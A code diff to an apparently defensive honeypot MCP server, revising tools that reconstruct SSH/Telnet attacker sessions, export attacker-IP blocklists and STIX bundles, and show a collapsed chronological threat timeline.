+        cluster["example_ips"] = cluster["example_ips"][:_FINGERPRINT_EXAMPLES_SHOWN]
+        del cluster["kex_offer_start"]
+    result["count"] = len(result["clusters"])
+    if result["clusters_matching"] > result["count"] and "note" not in result:
+        result["note"] = (
+            f"Showing the {result['count']} largest of {result['clusters_matching']} groups. "
+            "Ask for a larger min_sources, or analyse an example address, to go further."
+        )
+    return mark_untrusted(result)
+
+
+# A session id is an indexed-nowhere string inside the payload, so finding it by scanning every
+# alert costs a full table scan (17 s on a 17.7M-row database). Every session starts with a
+# `*_session_connect` event (a few hundred thousand rows at most), so the id is found there first,
+# which gives the source address and the time, and the rest of the session is read by that
+# source's index inside a window that covers any real session.
+_SESSION_ID_RE = re.compile(r"^[A-Za-z0-9-]{4,64}$")
+_SESSION_ANCHORS = ("ssh_session_connect", "telnet_session_connect")
+_SESSION_ENDS = ("ssh_session_closed", "telnet_session_closed")
+_SESSION_SPAN = timedelta(hours=12)
+_SESSION_MAX_EVENTS = 2000
+_SESSION_COMMANDS_SHOWN = 40
+_SESSION_TIMELINE_SHOWN = 40
+_SESSION_LOGINS_SHOWN = 10
+_SESSION_TEXT_CHARS = 200
+
+
+def _planted_safe(planted: Any, value: Any) -> Any:
+    """`value` with every planted honeytoken secret in its strings masked, clipped for a digest."""
+    if isinstance(value, str):
+        return planted.redact(value)[:_SESSION_TEXT_CHARS]
+    return value
 
 
 @mcp.tool(**hints("analyze_session"))
 async def analyze_session(session_id: str) -> dict[str, Any]:
-    """Reconstruct a single SSH attack session into a coherent timeline.
+    """What did one SSH or Telnet attacker session do, step by step?
 
-    Cowrie tags every event with a session ID — this tool pulls every alert
-    whose payload contains that session, sorted chronologically, and extracts
-    the credentials tried and commands run. This is the unit of analysis a
-    real SOC works in: 'show me what this attacker actually did'.
+    Use it for "what happened in session a1b2c3d4e5f6", "show me what that attacker typed".
+    Returns who connected, the logins tried, the commands run, and a short timeline. The session
+    id is in the `session` field of any SSH/Telnet alert (see `alerts_get`).
 
     Args:
-        session_id: The Cowrie session ID (found in any SSH alert's payload.session field).
+        session_id: The session id, e.g. a 12-character hex string such as a1b2c3d4e5f6.
     """
     from sqlalchemy import String, cast, select
 
     from honeypot_mcp.storage.models import Alert
+    from honeypot_mcp.tools._planted import load_planted
 
+    session_id = (session_id or "").strip()
+    if not _SESSION_ID_RE.match(session_id):
+        return {
+            "error": f"'{session_id}' does not look like a session id.",
+            "hint": "Pass the `session` value from an SSH or Telnet alert's payload "
+            "(letters, digits and dashes, e.g. a1b2c3d4e5f6); `alerts_get` shows it.",
+        }
     needle = f'"session": "{session_id}"'
+    in_payload = cast(Alert.payload, String).contains(needle, autoescape=True)
+
     async with get_session() as session:
+        anchor = (
+            await session.execute(
+                select(Alert.source_ip, Alert.timestamp, Alert.event_type)
+                .where(Alert.event_type.in_(_SESSION_ANCHORS + _SESSION_ENDS), in_payload)
+                .order_by(Alert.timestamp)
+                .limit(1)
+            )
+        ).first()
+        if anchor is None:
+            return {
+                "error": f"No SSH or Telnet session '{session_id}' found.",
+                "hint": "Check the id against an alert: `alerts_search` for the id, or "
+                "`alerts_recent` for an address, shows the `session` field. Ids of sessions "
+                "removed by `alerts_prune` are gone.",
+            }
+        source_ip, anchor_ts, anchor_type = anchor
+        start, end = (
+            (anchor_ts - _SESSION_SPAN, anchor_ts + timedelta(minutes=1))
+            if anchor_type in _SESSION_ENDS
+            else (anchor_ts - timedelta(minutes=1), anchor_ts + _SESSION_SPAN)
+        )
         result = await session.execute(
             select(Alert)
-            .where(cast(Alert.payload, String).contains(needle))
-            .order_by(Alert.timestamp)
+            .where(
+                Alert.source_ip == source_ip,
+                Alert.timestamp >= start,
+                Alert.timestamp <= end,
+                in_payload,
+            )
+            .order_by(Alert.timestamp, Alert.id)
+            .limit(_SESSION_MAX_EVENTS + 1)
         )
         alerts = list(result.scalars().all())
-
-    if not alerts:
-        return {"error": f"No alerts found for session_id={session_id}"}
+    capped = len(alerts) > _SESSION_MAX_EVENTS
+    alerts = alerts[:_SESSION_MAX_EVENTS]
+    planted = await load_planted()
 
     timeline: list[dict[str, Any]] = []
     commands: list[str] = []
     login_attempts: list[dict[str, Any]] = []
     successful_login: dict[str, Any] | None = None
+    protocol = None
 
     for a in alerts:
         entry: dict[str, Any] = {
@@ -1093,38 +1316,59 @@ async def analyze_session(session_id: str) -> dict[str, Any]:
             "severity": a.severity.value,
         }
         p = a.payload or {}
-        if a.event_type == "ssh_command_input":
-            cmd = p.get("input", "")
+        protocol = protocol or p.get("protocol")
+        kind = a.event_type.split("_", 1)[1] if "_" in a.event_type else a.event_type
+        if kind == "command_input":
+            cmd = _planted_safe(planted, p.get("input", ""))
             commands.append(cmd)
             entry["command"] = cmd
-        elif a.event_type in ("ssh_login_failed", "ssh_login_success"):
+        elif kind in ("login_failed", "login_success"):
             attempt = {
-                "username": p.get("username"),
-                "password": p.get("password"),
-                "success": a.event_type == "ssh_login_success",
+                "username": _planted_safe(planted, p.get("username")),
+                "password": _planted_safe(planted, p.get("password")),
+                "success": kind == "login_success",
             }
             login_attempts.append(attempt)
             if attempt["success"]:
                 successful_login = attempt
-            entry["credentials"] = f"{p.get('username') or ''}:{p.get('password') or ''}"
-        elif a.event_type == "ssh_file_download":
-            entry["url"] = p.get("url", "")
-            entry["outfile"] = p.get("outfile", "")
+            entry["credentials"] = f"{attempt['username'] or ''}:{attempt['password'] or ''}"
+        elif kind == "file_download":
+            entry["url"] = _planted_safe(planted, p.get("url", ""))
+            entry["outfile"] = _planted_safe(planted, p.get("outfile", ""))
         timeline.append(entry)
 
     duration = (alerts[-1].timestamp - alerts[0].timestamp).total_seconds()
-    return {
+    out: dict[str, Any] = {
         "session_id": session_id,
-        "source_ip": alerts[0].source_ip,
+        "source_ip": source_ip,
+        "protocol": protocol,
         "first_event": alerts[0].timestamp.isoformat(),
         "last_event": alerts[-1].timestamp.isoformat(),
         "duration_seconds": duration,
         "total_events": len(alerts),
-        "login_attempts": login_attempts,
+        "login_attempts_total": len(login_attempts),
+        "login_attempts": login_attempts[:_SESSION_LOGINS_SHOWN],
         "successful_login": successful_login,
-        "commands_executed": commands,
-        "timeline": timeline,
+        "commands_total": len(commands),
+        "commands_executed": commands[:_SESSION_COMMANDS_SHOWN],
+        "timeline": timeline[:_SESSION_TIMELINE_SHOWN],
     }
+    cut = [
+        name
+        for name, total, shown in (
+            ("logins", len(login_attempts), _SESSION_LOGINS_SHOWN),
+            ("commands", len(commands), _SESSION_COMMANDS_SHOWN),
+            ("timeline entries", len(timeline), _SESSION_TIMELINE_SHOWN),
+        )
+        if total > shown
+    ]
+    if cut or capped:
+        out["note"] = (
+            f"Showing the first {', '.join(cut)} of a long session."
+            if cut
+            else f"A very long session: only its first {_SESSION_MAX_EVENTS:,} events were read."
+        )
+    return mark_untrusted(out)
 
 
 def _usable_offenders(
@@ -1165,42 +1409,52 @@ def _stix_escape(value: str) -> str:
     return value.replace("\\", "\\\\").replace("'", "\\'")
 
 
-@mcp.tool(auth=require_role("operator"), **hints("export_blocklist"))
-async def export_blocklist(
-    format: Literal["plain", "iptables", "fail2ban", "cidr"] = "plain",
-    hours: int = 24,
-    min_hits: int = 5,
-    output_path: str | None = None,
-) -> dict[str, Any]:
-    """Export attacker IPs above a hit threshold as a blocklist file.
-
-    Writes the list to disk and returns the path plus the top offenders —
-    the content is destined for a firewall, a fail2ban jail or a Cloudflare
-    list, and it grows one line per offending IP, so a busy sensor produces
-    far more than is useful to read back.
-
-    Args:
-        format: 'plain' (one IP per line), 'iptables' (DROP rules),
-                'fail2ban' (jail-friendly), or 'cidr' (one IP per line, /32 suffix).
-        hours: Time window — only count alerts in the last N hours (default 24).
-        min_hits: Only include IPs with at least this many alerts (default 5).
-        output_path: Where to write. Defaults to `reports/blocklist-<timestamp>.txt`.
-    """
+async def _offenders_for_export(hours: int, min_hits: int) -> dict[str, Any] | list[Any]:
+    """The addresses an export may list, or an actionable `{"error", "hint"}` dict."""
+    if hours < 1:
+        return {
+            "error": "hours must be at least 1.",
+            "hint": "Use 24 for today, 168 for this week.",
+        }
+    if min_hits < 1:
+        return {
+            "error": "min_hits must be at least 1.",
+            "hint": "Say how many alerts an address needs to be listed, e.g. 5.",
+        }
     end = await window_end()
     async with get_session() as session:
         raw_offenders = await queries.get_top_offenders(
             session, hours, min_hits, global_only=True, exclude_udp_only=True, now=end
         )
     try:
-        offenders = _usable_offenders(raw_offenders)
+        return list(_usable_offenders(raw_offenders))
     except ValueError as e:
-        return {"error": str(e)}
+        return {
+            "error": str(e),
+            "hint": "BLOCKLIST_ALLOWLIST in the server's environment must hold comma-separated "
+            "IP addresses or CIDR ranges.",
+        }
+
+
+async def write_blocklist(
+    format: str, hours: int, min_hits: int, output_path: str | None = None
+) -> dict[str, Any]:
+    """Write the blocklist file; `export_blocklist` is this with an automatic file name."""
+    found = await _offenders_for_export(hours, min_hits)
+    if isinstance(found, dict):
+        return found
+    offenders = found
 
     if not offenders:
-        return {
-            "ip_count": 0,
-            "note": f"No attackers met the threshold (>= {min_hits} hits in {hours}h).",
-        }
+        return await annotate_window(
+            {
+                "ip_count": 0,
+                "window_hours": hours,
+                "min_hits": min_hits,
+                "note": f"No attacker met the threshold (at least {min_hits} alerts in the last "
+                f"{hours}h), so no file was written. Try a longer window or a lower min_hits.",
+            }
+        )
 
     header = (
         f"# HoneyPot MCP blocklist — generated {datetime.now(UTC).isoformat()}\n"
@@ -1235,39 +1489,40 @@ async def export_blocklist(
     )
 
 
-@mcp.tool(auth=require_role("operator"), **hints("export_stix"))
-async def export_stix(
+@mcp.tool(auth=require_role("operator"), **hints("export_blocklist"))
+async def export_blocklist(
+    format: Literal["plain", "iptables", "fail2ban", "cidr"] = "plain",
     hours: int = 24,
-    min_hits: int = 1,
-    output_path: str | None = None,
+    min_hits: int = 5,
 ) -> dict[str, Any]:
-    """Export attacker IPs as a STIX 2.1 bundle file for sharing with other SOCs.
+    """Write a blocklist file of the addresses that attacked us, for a firewall or fail2ban.
 
-    Writes the bundle to disk and returns the path. STIX is verbose by design —
-    a few hundred alerts produce well over 100 KB of JSON — and it is meant to
-    be loaded into a TIP or MISP instance, not read back in conversation.
-
-    Each unique attacker IP becomes an Indicator SDO with the standard
-    `[ipv4-addr:value = '...']` pattern and the 'malicious-activity' label.
+    Use it for "give me a blocklist", "iptables rules for everyone who hit us today", "block
+    anything with 100+ hits". Saves a new file and returns its path, the count and the top
+    offenders; the list itself can be long, so it is not printed. Only public addresses; never
+    your allowlisted ones.
 
     Args:
-        hours: Time window — only IPs seen in the last N hours.
-        min_hits: Minimum alert count for inclusion.
-        output_path: Where to write. Defaults to `reports/stix-<timestamp>.json`.
+        format: plain (one address per line, the default), iptables (DROP rules), fail2ban, or
+            cidr (each address as /32 or /128).
+        hours: Count alerts from the last N hours ("today" 24, "this week" 168). Default 24.
+        min_hits: List only addresses with at least this many alerts ("100+ hits" is 100).
+            Default 5.
     """
+    return await write_blocklist(format, hours, min_hits)
+
+
+async def write_stix_bundle(
+    hours: int, min_hits: int, output_path: str | None = None
+) -> dict[str, Any]:
+    """Write the STIX bundle file; `export_stix` is this with an automatic file name."""
     import json
     import uuid
-    from datetime import datetime
 
-    end = await window_end()
-    async with get_session() as session:
-        raw_offenders = await queries.get_top_offenders(
-            session, hours, min_hits, global_only=True, exclude_udp_only=True, now=end
-        )
-    try:
-        offenders = _usable_offenders(raw_offenders)
-    except ValueError as e:
-        return {"error": str(e)}
+    found = await _offenders_for_export(hours, min_hits)
+    if isinstance(found, dict):
+        return found
+    offenders = found
 
     now = datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%S.000Z")
     objects = [
@@ -1296,67 +1551,156 @@ async def export_stix(
     )
     if "error" in written:
         return written
-    return await annotate_window(
-        {
-            **written,
-            "bundle_id": bundle["id"],
-            "indicator_count": len(objects),
-            "window_hours": hours,
-            "min_hits": min_hits,
-        }
-    )
+    result: dict[str, Any] = {
+        **written,
+        "bundle_id": bundle["id"],
+        "indicator_count": len(objects),
+        "window_hours": hours,
+        "min_hits": min_hits,
+    }
+    if not objects:
+        result["note"] = (
+            f"No attacker met the threshold (at least {min_hits} alerts in the last {hours}h), "
+            "so the bundle is empty. Try a longer window or a lower min_hits."
+        )
+    return await annotate_window(result)
+
+
+@mcp.tool(auth=require_role("operator"), **hints("export_stix"))
+async def export_stix(hours: int = 24, min_hits: int = 1) -> dict[str, Any]:
+    """Write a STIX 2.1 file of the attacker addresses, to share with another team or a TIP/MISP.
+
+    Use it for "export our indicators as STIX", "STIX bundle of this week's attackers". Saves a
+    new file and returns its path and the number of indicators; the bundle is too large to print.
+    Only public addresses.
+
+    Args:
+        hours: Include addresses seen in the last N hours ("today" 24, "this week" 168). Default 24.
+        min_hits: Only addresses with at least this many alerts. Default 1.
+    """
+    return await write_stix_bundle(hours, min_hits)
+
+
+# The newest rows a timeline reads, and the most entries (one entry = a run of the same source and
+# event type, collapsed) it lists. A flood of one event from one source is one entry.
+_TIMELINE_ROWS = 1000
+_TIMELINE_ENTRIES = 40
 
 
 @mcp.tool(**hints("threat_timeline"))
 async def threat_timeline(
     ip: str | None = None,
-    hours: int = 24,
-    limit: int = 200,
+    hours: float = 24,
+    min_severity: Literal["low", "medium", "high", "critical"] = "low",
 ) -> dict[str, Any]:
-    """A chronological feed of events, newest last, for a time range or one IP: the narrative view.
-    For counts and rankings use `alerts_stats`; for one attacker's story by ATT&CK phase use
-    `analyze_attacker_journey`.
+    """What happened, in order? A chronological feed, newest last, for a time range or one source.
+
+    Use it for "what happened in the last hour", "what did 203.0.113.7 do today", "show me only
+    critical events". Repeated events from one source are collapsed into one line with a count;
+    the latest 40 lines are shown with the exact total for the window. For counts and rankings
+    use `alerts_stats`; for one attacker's story by ATT&CK phase use `analyze_attacker_journey`.
 
     Args:
-        ip: Filter to a specific attacker IP (omit for all sources).
-        hours: How many hours back to look (default 24).
-        limit: Maximum events to return (default 200). When a window has more
-              matching events than this, the most recent `limit` are kept —
-              not the oldest — since recency is what a caller filtering to
-              "the last N hours" almost always wants.
+        ip: Only this source address.
+        hours: How far back ("last hour" is 1, "today" 24, "this week" 168). Default 24.
+        min_severity: Only events at this severity or above ("only critical" is critical).
     """
 
     from sqlalchemy import select
 
-    from honeypot_mcp.storage.models import Alert
+    from honeypot_mcp.storage.models import Alert, AlertSeverity, Honeypot
 
-    since, _ = await window_bounds(hours)
+    if hours <= 0:
+        return {
+            "error": "hours must be greater than 0.",
+            "hint": "Use 1 for the last hour, 24 for today, 168 for this week.",
+        }
+    if ip:
+        if err := validate_ip(ip):
+            return {"error": err, "hint": "Pass an address like 203.0.113.7, or omit ip."}
+        ip = ip.strip()
+    hours = min(hours, 24 * 365 * 5)
+    since, window_to = await window_bounds(hours)
+    allowed = [s for s in AlertSeverity if _SEVERITY_RANK[s.value] >= _SEVERITY_RANK[min_severity]]
 
     async with get_session() as session:
-        q = select(Alert).where(Alert.timestamp >= since)
+        exact = await rollups.stats(session, since, ip=ip, top=1, now=window_to)
+        q = select(
+            Alert.timestamp, Alert.source_ip, Alert.event_type, Alert.severity, Alert.honeypot_id
+        ).where(Alert.timestamp >= since)
         if ip:
             q = q.where(Alert.source_ip == ip)
-        # Order DESC to select the most recent `limit` rows when the window
-        # holds more than that; re-sorted ASC below for chronological display.
-        q = q.order_by(Alert.timestamp.desc()).limit(limit)
-        result = await session.execute(q)
-        alerts = sorted(result.scalars().all(), key=lambda a: a.timestamp)
+        if min_severity != "low":
+            q = q.where(Alert.severity.in_(allowed))
+        # Newest rows first so a busy window keeps the recent end; listed oldest first below.
+        rows = (
+            await session.execute(q.order_by(Alert.timestamp.desc()).limit(_TIMELINE_ROWS))
+        ).all()
+        hp_ids = {r[4] for r in rows if r[4] is not None}
+        names: dict[int, str] = {}
+        if hp_ids:
+            names = {
+                r[0]: r[1]
+                for r in (
+                    await session.execute(
+                        select(Honeypot.id, Honeypot.name).where(Honeypot.id.in_(hp_ids))
+                    )
+                ).all()
+            }
 
-    events = [
-        {
-            "timestamp": a.timestamp.isoformat(),
-            "source_ip": a.source_ip,
-            "event_type": a.event_type,
-            "severity": a.severity.value,
-            "honeypot_id": a.honeypot_id,
-        }
-        for a in alerts
-    ]
-    out: dict[str, Any] = {"count": len(events), "events": events, "window": f"last {hours}h"}
-    await annotate_window(out)
-    if len(events) == limit:
-        out["note"] = (
-            f"Hit the limit of {limit} — there may be more (and older) events in "
-            f"this window. Narrow with `ip`, shrink `hours`, or raise `limit`."
+    entries: list[dict[str, Any]] = []
+    for ts, source, event_type, severity, hp_id in reversed(rows):
+        sev = severity.value if hasattr(severity, "value") else str(severity)
+        last = entries[-1] if entries else None
+        if (
+            last is not None
+            and last["source_ip"] == source
+            and last["event_type"] == event_type
+            and last["honeypot"] == names.get(hp_id)
+        ):
+            last["repeated"] += 1
+            last["until"] = ts.isoformat()
+            if _SEVERITY_RANK[sev] > _SEVERITY_RANK[last["severity"]]:
+                last["severity"] = sev
+            continue
+        entries.append(
+            {
+                "timestamp": ts.isoformat(),
+                "source_ip": source,
+                "event_type": event_type,
+                "severity": sev,
+                "honeypot": names.get(hp_id),
+                "repeated": 1,
+            }
         )
-    return out
+    shown = entries[-_TIMELINE_ENTRIES:]
+    for entry in shown:
+        if entry["repeated"] == 1:
+            del entry["repeated"]
+    covered = sum(e.get("repeated", 1) for e in shown)
+    in_window = sum(
+        n
+        for sev, n in exact["by_severity"].items()
+        if _SEVERITY_RANK[sev] >= _SEVERITY_RANK[min_severity]
+    )
+
+    out: dict[str, Any] = {
+        "window": f"last {hours:g}h",
+        "events_in_window": in_window,
+        "count": len(shown),
+        "events": shown,
+    }
+    if not rows:
+        out["note"] = (
+            f"No events in the last {hours:g}h"
+            + (f" from {ip}" if ip else "")
+            + (f" at {min_severity} severity or above" if min_severity != "low" else "")
+            + ". Try a longer window or a lower min_severity."
+        )
+    elif covered < in_window:
+        out["note"] = (
+            f"Showing the latest {len(shown)} lines, covering {covered:,} of {in_window:,} events "
+            "in the window (repeats from one source are one line). For the rest ask for a "
+            "shorter window, one source address, or only critical or high severity."
+        )
+    return await annotate_window(out)
